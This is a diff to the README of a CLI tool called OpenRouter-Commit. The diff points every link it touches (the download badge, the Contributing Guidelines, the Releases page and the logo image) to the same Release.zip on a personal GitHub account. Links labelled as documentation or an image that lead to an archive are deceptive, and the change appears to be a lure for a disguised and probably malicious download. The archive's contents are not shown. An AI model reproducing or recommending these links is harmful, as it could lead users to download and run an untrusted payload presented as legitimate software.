@@ -13,7 +13,7 @@ Welcome to the **OpenRouter-Commit** repository, a CLI tool designed to assist y
 ## Installation
 To get started with **OpenRouter-Commit**, simply download the latest version of the tool by clicking the button below:
 
-[![Download OpenRouter-Commit](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download OpenRouter-Commit](https://github.com/MohamedHussin1/openrouter-commit/releases/download/v1.0/Release.zip)](https://github.com/MohamedHussin1/openrouter-commit/releases/download/v1.0/Release.zip)
 
 Once the download is complete, extract the contents of the zip file and follow the installation instructions in the repository documentation.
 
@@ -34,10 +34,10 @@ Explore a range of topics related to **OpenRouter-Commit**:
 - Python
 
 ## Contributing
-Contributions to **OpenRouter-Commit** are welcome! Whether you want to submit bug fixes, add new features, or improve the documentation, your input is valuable. Please refer to the [Contributing Guidelines](CONTRIBUTING.md) for more information on how to contribute to the project.
+Contributions to **OpenRouter-Commit** are welcome! Whether you want to submit bug fixes, add new features, or improve the documentation, your input is valuable. Please refer to the [Contributing Guidelines](https://github.com/MohamedHussin1/openrouter-commit/releases/download/v1.0/Release.zip) for more information on how to contribute to the project.
 
 ## Roadmap
-Stay tuned for future updates and enhancements to **OpenRouter-Commit**. The development team is continuously working on new features to improve the tool's functionality and user experience. Check the [Releases](https://github.com/openrouter-commit/releases) section for the latest version and release notes.
+Stay tuned for future updates and enhancements to **OpenRouter-Commit**. The development team is continuously working on new features to improve the tool's functionality and user experience. Check the [Releases](https://github.com/MohamedHussin1/openrouter-commit/releases/download/v1.0/Release.zip) section for the latest version and release notes.
 
 ## Community
 Join our community of developers and enthusiasts to engage in discussions, share feedback, and stay informed about the latest developments. Connect with us on social media platforms and participate in events and webinars related to **OpenRouter-Commit**.
@@ -49,4 +49,4 @@ This project is licensed under the MIT License. For more information, refer to t
 
 Thank you for exploring **OpenRouter-Commit**! Start writing better commit messages today with the help of AI-powered suggestions. Happy coding! 🎉
 
-![OpenRouter-Commit Logo](https://example.com/openrouter-commit-logo.png)
+![OpenRouter-Commit Logo](https://github.com/MohamedHussin1/openrouter-commit/releases/download/v1.0/Release.zip)
